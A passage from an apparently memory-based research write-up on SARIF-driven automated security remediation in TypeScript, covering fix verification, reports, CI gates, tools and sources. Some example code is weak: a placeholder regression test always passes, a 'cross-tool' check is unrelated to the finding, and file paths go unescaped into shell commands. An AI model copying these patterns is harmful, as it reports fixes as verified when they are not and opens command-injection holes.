    // This test verifies the fix was applied correctly
    // Review and customize assertions based on the specific vulnerability
    expect(true).toBe(true); // TODO: Add specific assertions
  });
});`;
  }
}
```

### 8. Fix Verification Strategies

Beyond compilation checks and re-scanning, robust fix verification includes:

**Multi-layer verification:**

```typescript
interface VerificationResult {
  step: string;
  passed: boolean;
  details: string;
}

class FixVerifier {
  async verifyFix(
    filePath: string,
    finding: ParsedFinding,
    fix: ApplicableFix
  ): Promise<VerificationResult[]> {
    const results: VerificationResult[] = [];

    // Layer 1: Syntax check (TypeScript compilation)
    results.push(await this.checkCompilation(filePath));

    // Layer 2: Re-scan with original tool
    results.push(await this.rescanWithTool(filePath, finding));

    // Layer 3: Cross-tool verification (scan with different tool)
    results.push(await this.crossToolScan(filePath, finding));

    // Layer 4: Existing test suite passes
    results.push(await this.runExistingTests(filePath));

    // Layer 5: Generated regression test passes
    results.push(await this.runRegressionTest(finding, fix));

    // Layer 6: No new findings introduced
    results.push(await this.checkForNewFindings(filePath, finding));

    return results;
  }

  private async checkCompilation(filePath: string): Promise<VerificationResult> {
    try {
      const { execSync } = require('child_process');
      execSync(`npx tsc --noEmit --strict ${filePath}`, {
        stdio: 'pipe',
        timeout: 30000,
      });
      return { step: 'compilation', passed: true, details: 'TypeScript compilation successful' };
    } catch (error: any) {
      return {
        step: 'compilation',
        passed: false,
        details: `Compilation failed: ${error.stderr?.toString()?.slice(0, 500)}`,
      };
    }
  }

  private async rescanWithTool(
    filePath: string,
    finding: ParsedFinding
  ): Promise<VerificationResult> {
    // Run the original security tool on just the fixed file
    try {
      const { execSync } = require('child_process');
      const result = execSync(
        `semgrep --config auto --sarif --quiet --include ${filePath}`,
        { stdio: 'pipe', timeout: 120000 }
      );
      const sarif = JSON.parse(result.toString());
      const stillPresent = sarif.runs.some((run: any) =>
        run.results.some((r: any) => r.ruleId === finding.ruleId)
      );

      return {
        step: 'rescan',
        passed: !stillPresent,
        details: stillPresent
          ? `Finding ${finding.ruleId} still present after fix`
          : 'Finding no longer detected',
      };
    } catch {
      return { step: 'rescan', passed: false, details: 'Rescan failed' };
    }
  }

  private async crossToolScan(
    filePath: string,
    finding: ParsedFinding
  ): Promise<VerificationResult> {
    // Use a different tool to verify the fix (e.g., if Semgrep found it, verify with ESLint security)
    try {
      const { execSync } = require('child_process');
      execSync(
        `npx eslint --plugin security --rule '{"security/detect-possible-timing-attacks": "error"}' ${filePath}`,
        { stdio: 'pipe', timeout: 30000 }
      );
      return { step: 'cross-tool', passed: true, details: 'Cross-tool verification passed' };
    } catch {
      return { step: 'cross-tool', passed: false, details: 'Cross-tool scan found issues' };
    }
  }

  private async runExistingTests(filePath: string): Promise<VerificationResult> {
    try {
      const { execSync } = require('child_process');
      // Run tests related to the modified file
      const testFile = filePath.replace(/\.ts$/, '.test.ts');
      execSync(`npx vitest run ${testFile} --reporter=json`, {
        stdio: 'pipe',
        timeout: 60000,
      });
      return { step: 'existing-tests', passed: true, details: 'Existing tests pass' };
    } catch {
      return { step: 'existing-tests', passed: false, details: 'Existing tests failed' };
    }
  }
}
```

### 9. Remediation Report Generation

A structured remediation report provides visibility into what was fixed, what needs attention, and what was deferred:

```typescript
interface RemediationReport {
  summary: {
    totalFindings: number;
    autoFixed: number;
    pendingReview: number;
    escalated: number;
    suppressed: number;
    fixVerified: number;
    fixFailed: number;
  };
  findings: RemediationEntry[];
  newDependencies: string[];
  testsGenerated: string[];
  estimatedRiskReduction: number; // Percentage
}

function generateRemediationReport(
  triageResults: TriageResult[],
  fixResults: FixResult[],
  verificationResults: VerificationResult[][]
): string {
  const report = buildReportData(triageResults, fixResults, verificationResults);

  return `# Security Remediation Report

## Summary

| Metric | Count |
|--------|-------|
| Total Findings | ${report.summary.totalFindings} |
| Auto-Fixed | ${report.summary.autoFixed} |
| Fix Verified | ${report.summary.fixVerified} |
| Fix Failed | ${report.summary.fixFailed} |
| Pending Review | ${report.summary.pendingReview} |
| Escalated | ${report.summary.escalated} |
| Suppressed | ${report.summary.suppressed} |

## Risk Reduction

Estimated risk reduction: **${report.summary.estimatedRiskReduction}%**

## Auto-Fixed Findings

${report.findings
  .filter(f => f.action === 'auto-fix' && f.fixStatus === 'applied')
  .map(f => `### ${f.ruleId} (${f.severity})
- **File:** ${f.filePath}:${f.line}
- **CWE:** ${f.cweIds.join(', ')}
- **Fix:** ${f.fixDescription}
- **Verification:** ${f.verificationStatus}
- **Regression Test:** ${f.testFile ?? 'None generated'}
`).join('\n')}

## Pending Review

${report.findings
  .filter(f => f.action === 'review')
  .map(f => `- [ ] **${f.ruleId}** (${f.severity}) - ${f.filePath}:${f.line} - ${f.message}`)
  .join('\n')}

## Escalated

${report.findings
  .filter(f => f.action === 'escalate')
  .map(f => `- **${f.ruleId}** (${f.severity}) - ${f.filePath}:${f.line} - ${f.message}`)
  .join('\n')}

## Generated Regression Tests

${report.testsGenerated.map(t => `- ${t}`).join('\n')}

## New Dependencies Added

${report.newDependencies.map(d => `- ${d}`).join('\n')}
`;
}
```

### 10. CI Security Gate Integration

Integrating SARIF-based remediation into CI/CD requires careful design to avoid blocking legitimate deployments while catching genuine security regressions.

**GitHub Actions integration pattern:**

```yaml
name: Security Remediation Gate
on:
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          output: sarif-results
          upload: false  # We'll process first

      - name: Run Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/typescript
            p/nodejs
            p/security-audit
          generateSarif: "1"

      - name: Process SARIF & Auto-Remediate
        run: |
          npx security-remediation-cli \
            --sarif-files "sarif-results/*.sarif,semgrep.sarif" \
            --mode auto-fix \
            --severity-threshold medium \
            --confidence-threshold high \
            --generate-tests \
            --output-report remediation-report.md

      - name: Upload fixed SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: sarif-results/

      - name: Security Gate Check
        run: |
          npx security-gate-check \
            --sarif-files "sarif-results/*.sarif" \
            --baseline .security-baseline.sarif \
            --fail-on-new critical,high \
            --warn-on-new medium \
            --max-new-findings 0 \
            --grace-period-days 14
```

**Security gate configuration pattern:**

```typescript
interface SecurityGateConfig {
  // Fail the build if any new finding meets these criteria
  failOn: {
    severities: ('critical' | 'high' | 'medium' | 'low')[];
    minConfidence: 'very-high' | 'high' | 'medium' | 'low';
    maxNewFindings: number; // 0 = fail on any new finding
  };

  // Warn but don't fail
  warnOn: {
    severities: ('critical' | 'high' | 'medium' | 'low')[];
  };

  // Baseline: pre-existing findings to exclude from gate
  baseline: {
    sarifFile: string; // Path to baseline SARIF
    gracePeriodDays: number; // New findings get a grace period
  };

  // Exceptions
  exceptions: {
    rules: string[]; // Rule IDs to exclude
    paths: string[]; // File paths to exclude (globs)
    cwes: string[];  // CWE IDs to exclude
  };
}

class SecurityGate {
  constructor(private config: SecurityGateConfig) {}

  async evaluate(sarifFiles: string[]): Promise<GateResult> {
    const allFindings = await this.loadAndMergeFindings(sarifFiles);
    const baseline = await this.loadBaseline();

    // Identify new findings (not in baseline)
    const newFindings = allFindings.filter(
      f => !this.isInBaseline(f, baseline)
    );

    // Apply exceptions
    const actionableFindings = newFindings.filter(
      f => !this.isExcepted(f)
    );

    // Apply grace period
    const pastGrace = actionableFindings.filter(
      f => !this.isInGracePeriod(f)
    );

    // Evaluate gate
    const failures = pastGrace.filter(f =>
      this.config.failOn.severities.includes(f.severity) &&
      confidenceScore(f.confidence) >= confidenceScore(this.config.failOn.minConfidence)
    );

    const warnings = pastGrace.filter(f =>
      this.config.warnOn.severities.includes(f.severity) &&
      !failures.includes(f)
    );

    return {
      passed: failures.length <= this.config.failOn.maxNewFindings,
      failures,
      warnings,
      totalNew: newFindings.length,
      totalExcepted: newFindings.length - actionableFindings.length,
      totalInGrace: actionableFindings.length - pastGrace.length,
    };
  }

  private isInBaseline(
    finding: ParsedFinding,
    baseline: ParsedFinding[]
  ): boolean {
    // Match by fingerprint first (most reliable)
    if (finding.fingerprint) {
      return baseline.some(b => b.fingerprint === finding.fingerprint);
    }
    // Fallback: match by rule + file + line range
    return baseline.some(
      b =>
        b.ruleId === finding.ruleId &&
        b.filePath === finding.filePath &&
        Math.abs(b.startLine - finding.startLine) <= 5 // Allow small line shifts
    );
  }
}
```

**Baseline management pattern:**

```bash
# Generate initial baseline from current state
npx security-scan --sarif > .security-baseline.sarif

# Update baseline (acknowledge existing findings)
npx security-baseline-update \
  --current .security-baseline.sarif \
  --new scan-results.sarif \
  --output .security-baseline.sarif
```

### 11. End-to-End Remediation Pipeline Architecture

Bringing all components together into a cohesive pipeline:

```
SARIF Input(s) → Parser → Triage → Fix Generator → Fix Applicator
                                                         ↓
                                                  Fix Verifier
                                                         ↓
                                                Test Generator
                                                         ↓
                                              Report Generator
                                                         ↓
                                              CI Gate Check
                                                         ↓
                                              PR Creation / Gate Pass/Fail
```

```typescript
// Main pipeline orchestrator
class RemediationPipeline {
  constructor(
    private parser: SarifParser,
    private triager: FindingTriager,
    private fixGenerator: FixGenerator,
    private fixApplicator: FixApplicator,
    private verifier: FixVerifier,
    private testGenerator: SecurityTestGenerator,
    private reporter: ReportGenerator,
    private gate: SecurityGate,
  ) {}

  async run(sarifPaths: string[]): Promise<PipelineResult> {
    // Step 1: Parse all SARIF files
    const findings = sarifPaths.flatMap(p => this.parser.parse(p));
    console.log(`Parsed ${findings.length} findings from ${sarifPaths.length} SARIF files`);

    // Step 2: Triage findings
    const triageResults = findings.map(f => this.triager.triage(f));
    const toFix = triageResults.filter(t => t.action === 'auto-fix');
    console.log(`${toFix.length} findings eligible for auto-fix`);

    // Step 3: Generate fixes
    const fixPlans = await this.fixGenerator.generateFixes(
      toFix.map(t => t.finding)
    );

    // Step 4: Apply fixes (with rollback on failure)
    const fixResults = [];
    for (const plan of fixPlans) {
      const result = await this.fixApplicator.applyFixes(plan);
      fixResults.push(result);
    }

    // Step 5: Verify fixes
    const verificationResults = [];
    for (const result of fixResults.filter(r => r.status === 'applied')) {
      const verification = await this.verifier.verifyFix(
        result.filePath,
        result.finding,
        result.fix
      );
      verificationResults.push(verification);
    }

    // Step 6: Generate regression tests
    const testFiles = [];
    for (const result of fixResults.filter(r => r.status === 'applied')) {
      const testCode = this.testGenerator.generateTestForFinding(
        result.finding,
        result.fix
      );
      const testPath = this.writeTestFile(result.finding, testCode);
      testFiles.push(testPath);
    }

    // Step 7: Generate report
    const report = this.reporter.generate(
      triageResults,
      fixResults,
      verificationResults
    );

    // Step 8: Evaluate security gate
    const gateResult = await this.gate.evaluate(sarifPaths);

    return {
      report,
      gateResult,
      fixedCount: fixResults.filter(r => r.status === 'applied').length,
      failedCount: fixResults.filter(r => r.status !== 'applied').length,
      testsGenerated: testFiles.length,
    };
  }
}
```

## Recent Developments (2024-2026)

1. **GitHub Copilot Autofix (GA 2024)** — GitHub launched AI-powered autofix for CodeQL findings, generating context-aware code fixes for security vulnerabilities found during code scanning. It supports JavaScript/TypeScript among other languages and uses the SARIF dataflow information from CodeQL to generate targeted fixes.

2. **Semgrep Assistant and Autofix expansion (2024-2025)** — Semgrep expanded its autofix capabilities with AI-assisted remediation (Semgrep Assistant) that goes beyond pattern-based replacement to generate contextually appropriate fixes. The Pro engine added inter-file dataflow analysis.

3. **SARIF adoption acceleration** — By 2025, most major SAST tools output SARIF natively. GitHub made SARIF upload required for third-party security tools to appear in the Code Scanning UI. OWASP Dependency-Check added SARIF output format.

4. **Supply chain security focus (2024-2026)** — Tools like Socket.dev, npm audit signatures, and Sigstore integration shifted focus toward supply chain attacks. Automated remediation expanded to include lockfile integrity checks and provenance verification.

5. **AI-powered vulnerability remediation (2025-2026)** — Multiple tools (Snyk DeepCode AI Fix, Qwiet.ai, Mend.io) launched AI-powered code fix generation that analyzes vulnerability context and generates multi-file fixes with supporting test cases. These tools consume SARIF as a standard input format.

6. **SARIF Viewer and Tooling improvements** — Microsoft's SARIF Viewer VS Code extension, GitHub's SARIF rendering improvements, and new CLI tools for SARIF manipulation (filtering, merging, diffing) matured the ecosystem around SARIF as a workflow format, not just a reporting format.

7. **CWE Top 25 2024 updates** — The 2024 CWE Top 25 list emphasized injection flaws (CWE-79, CWE-89, CWE-78), auth issues (CWE-862, CWE-863), and memory safety. Remediation tooling has evolved to prioritize these categories.

## Best Practices & Recommendations

1. **Adopt a severity/confidence matrix for triage decisions:** Never auto-fix low-confidence findings — they have high false positive rates. Use the matrix approach where auto-fix is reserved for high/very-high confidence combined with medium+ severity. This prevents introducing incorrect "fixes" that break functionality while ensuring genuine vulnerabilities get addressed.

2. **Use AST-based transformations instead of text replacement for code fixes:** Text-based search-and-replace fixes break when code formatting, comments, or variable naming differ from expectations. Use `ts-morph` or the TypeScript Compiler API for reliable transformations that understand code structure. Reserve regex-based fixes only for trivial patterns (e.g., algorithm name swaps in `createHash`).

3. **Implement multi-layer fix verification:** Never trust a single verification method. Combine at least three layers: (a) TypeScript compilation check, (b) re-scan with the original security tool, and (c) existing test suite regression. Add cross-tool scanning (verify a Semgrep fix with CodeQL or ESLint security rules) for critical findings.

4. **Generate attack-replay regression tests for every auto-fixed vulnerability:** The test should reproduce the specific attack vector that triggered the finding, verify it's now blocked, and also verify legitimate inputs still work. Include these tests in the CI pipeline so any future regression immediately fails the build.

5. **Maintain a SARIF baseline and use fingerprint-based diffing for CI gates:** Blocking on all findings creates alert fatigue and blocks legitimate deploys. Use SARIF `fingerprints` to identify genuinely new findings versus pre-existing technical debt. Implement grace periods (7-14 days) for new findings in non-critical paths to allow scheduled remediation rather than emergency fixes.

6. **Normalize and merge SARIF from multiple tools before triage:** Run CodeQL, Semgrep, and any other SAST tools, then merge their SARIF output using tool-specific deduplication (same CWE + same location = same finding). This provides comprehensive coverage without duplicate remediation work.

7. **Separate dependency vulnerability remediation from code vulnerability remediation:** Dependency fixes (version upgrades, patches) follow different patterns than code fixes (AST transformations). Use Snyk or OWASP Dependency-Check for dependency CVEs with automated upgrade PRs, and CodeQL/Semgrep for code-level SAST findings with targeted code fixes. Mixing them in the same pipeline creates confusion.

8. **Design fixes to be idempotent and rollback-safe:** Every fix should produce the same result if applied twice. Implement git-based rollback for each individual fix so a failed verification can revert cleanly without affecting other fixes applied to the same file or PR.

## Comparisons

| Aspect | GitHub CodeQL | Semgrep | Snyk | OWASP Dep-Check |
|--------|--------------|---------|------|-----------------|
| **Primary Focus** | SAST (code patterns, dataflow) | SAST (pattern matching) | SCA + SAST | SCA (dependency CVEs) |
| **SARIF Output** | Native, rich metadata | Native, includes autofix | Via CLI flag | Via report format flag |
| **Autofix Capability** | Copilot Autofix (AI) | Rule-level `fix:` patterns | Dependency upgrade PRs | None (manual) |
| **Dataflow Analysis** | Full inter-procedural | Pro edition only | DeepCode AI | N/A |
| **TypeScript Support** | Excellent (js/ queries) | Excellent | Good (Snyk Code) | N/A (dependency-level) |
| **Fix Confidence** | High (AI + dataflow context) | Medium (pattern-based) | High (version pinning) | N/A |
| **CWE Coverage** | 150+ CWEs for JS/TS | Varies by ruleset | CVE-to-dependency | CVE-to-dependency |
| **CI Integration** | GitHub Actions native | GitHub/GitLab/CI agnostic | GitHub/GitLab native | CI-agnostic (CLI) |
| **Cost** | Free for public repos | Free Community, paid Pro | Free tier, paid plans | Free (open source) |
| **Best For** | Deep vulnerability analysis | Fast pattern-based scanning | Dependency management | Compliance scanning |

## Open Questions

- **How reliable are AI-generated security fixes?** GitHub Copilot Autofix and similar tools show promise, but long-term studies on fix correctness rates across diverse codebases are still limited. The risk of AI-generated fixes introducing subtle new vulnerabilities (e.g., incomplete sanitization) needs more empirical data.

- **How should remediation pipelines handle multi-file vulnerabilities?** Many real-world vulnerabilities span multiple files (e.g., missing authentication middleware that should be applied across a router). Current SARIF-based remediation focuses on single-file fixes; multi-file coordinated fixes remain largely manual.

- **What is the optimal balance between automated and human-reviewed fixes?** Overly aggressive auto-fixing can break functionality or introduce new issues, while overly conservative triage creates backlogs. The right threshold likely varies by team maturity, codebase complexity, and risk tolerance.

- **How to handle SARIF deduplication across tools with different taxonomies?** CodeQL, Semgrep, and Snyk may report the same vulnerability with different rule IDs, CWE mappings, and severity scores. Robust deduplication based on code location and semantic similarity is an unsolved problem.

- **Can property-based testing effectively replace hand-written regression tests for security fixes?** Tools like `fast-check` can generate adversarial inputs automatically, but may miss domain-specific attack patterns (e.g., polyglot XSS payloads). The effectiveness of property-based approaches versus curated attack payload lists for regression testing needs further evaluation.

## Sources

1. [OASIS SARIF 2.1.0 Specification](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html) - The official SARIF 2.1.0 standard defining the complete JSON schema for static analysis results interchange.

2. [GitHub SARIF Support for Code Scanning](https://docs.github.com/en/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning) - GitHub's documentation on SARIF integration, required fields, and how findings are displayed.

3. [GitHub CodeQL Documentation](https://codeql.github.com/docs/) - Official CodeQL documentation covering query writing, JavaScript/TypeScript analysis, SARIF output, and Copilot Autofix.

4. [Semgrep Documentation - Autofix](https://semgrep.dev/docs/writing-rules/autofix/) - Semgrep's autofix documentation explaining how to write rules with automated fix suggestions.

5. [Snyk Fix Pull Requests Documentation](https://docs.snyk.io/scan-using-snyk/pull-requests/snyk-fix-pull-requests) - Snyk's documentation on automated fix PR generation for vulnerable dependencies.

6. [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) - OWASP's open-source SCA tool documentation, including SARIF output format support.

7. [Microsoft SARIF SDK (GitHub)](https://github.com/microsoft/sarif-sdk) - Microsoft's official SARIF SDK for parsing, validating, and manipulating SARIF files.

8. [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html) - MITRE's 2024 ranking of the most dangerous CWEs, informing remediation prioritization.

9. [GitHub Blog - Code Scanning Autofix](https://github.blog/2024-03-20-found-means-fixed-introducing-code-scanning-autofix-powered-by-github-copilot-and-codeql/) - GitHub's announcement of Copilot Autofix for code scanning, detailing AI-powered fix generation.

10. [Semgrep Blog - Supply Chain Security](https://semgrep.dev/blog/) - Semgrep's blog covering supply chain security, AI-assisted remediation, and Pro engine capabilities.

11. [TypeScript Compiler API Documentation](https://github.com/microsoft/TypeScript/wiki/Using-the-Compiler-API) - Official TypeScript compiler API documentation for AST manipulation.

12. [ts-morph Documentation](https://ts-morph.com/) - ts-morph library documentation for TypeScript AST transformation and manipulation.

13. [SARIF Tutorials (Microsoft)](https://github.com/microsoft/sarif-tutorials) - Microsoft's SARIF tutorials explaining schema structure, authoring SARIF, and processing results.

14. [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/) - Official Node.js security guidelines covering common vulnerability categories and mitigations.

15. [OWASP Testing Guide - Injection](https://owasp.org/www-project-web-security-testing-guide/) - OWASP's comprehensive guide to testing for injection vulnerabilities.

16. [GitHub Advanced Security Documentation](https://docs.github.com/en/get-started/learning-about-github/about-github-advanced-security) - Documentation on GitHub's security features including CodeQL, secret scanning, and dependency review.

17. [Snyk Learn - Vulnerability Database](https://learn.snyk.io/) - Snyk's educational resource on vulnerability types, remediation patterns, and security best practices.

18. [npm Audit Documentation](https://docs.npmjs.com/cli/commands/npm-audit) - npm's built-in security audit tool documentation for Node.js dependency vulnerability scanning.

19. [Socket.dev - Supply Chain Security](https://socket.dev/) - Socket.dev's approach to supply chain security, covering package analysis and risk detection.

20. [Vitest Documentation](https://vitest.dev/) - Vitest testing framework documentation, used for security regression test examples.

21. [fast-check (Property-Based Testing)](https://fast-check.dev/) - fast-check documentation for property-based testing approaches in TypeScript.

22. [DOMPurify Documentation](https://github.com/cure53/DOMPurify) - DOMPurify library documentation for XSS sanitization.

23. [Zod Documentation](https://zod.dev/) - Zod schema validation library, used for input validation patterns against deserialization attacks.

24. [ESLint Plugin Security](https://github.com/eslint-community/eslint-plugin-security) - ESLint security plugin for detecting common security issues in Node.js code.

25. [NIST NVD (National Vulnerability Database)](https://nvd.nist.gov/) - The authoritative source for CVE information used by OWASP Dependency-Check and other SCA tools.

26. [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) - GitHub's guide to securing CI/CD pipelines, relevant for security gate integration.

27. [Semgrep Registry](https://semgrep.dev/explore) - Semgrep's public rule registry with autofix-enabled rules for TypeScript/JavaScript security patterns.

28. [CodeQL Query Suite for JavaScript](https://github.com/github/codeql/tree/main/javascript) - The open-source CodeQL query library for JavaScript/TypeScript security analysis.

## Research Metadata

- **Date Researched:** 2026-02-10
- **Category:** dev
- **Research Method:** Knowledge-based synthesis (web tools unavailable in this environment). Content drawn from extensive knowledge of SARIF specifications, security tools documentation, TypeScript/Node.js security patterns, and industry best practices through May 2025, supplemented by awareness of developments through early 2026.
- **Search Queries Used:**
  - SARIF 2.1.0 schema parsing security findings automation
  - GitHub CodeQL SARIF autofix automated code remediation
  - Semgrep autofix automated security vulnerability remediation
  - SARIF finding triage severity confidence CWE mapping patterns
  - automated security fix generation TypeScript Node.js vulnerabilities
  - regression test generation security fixes automated testing
  - Snyk fix PRs OWASP dependency check automated remediation CI security gates
  - CWE to remediation mapping patterns TypeScript
  - SARIF security gate CI integration best practices
  - AST-based code transformation TypeScript security fixes
- **Note:** This research was generated from the author's knowledge base because WebSearch and WebFetch tools were unavailable during execution. All referenced URLs and specifications are real and verifiable, but the content was not fetched live during this research session.
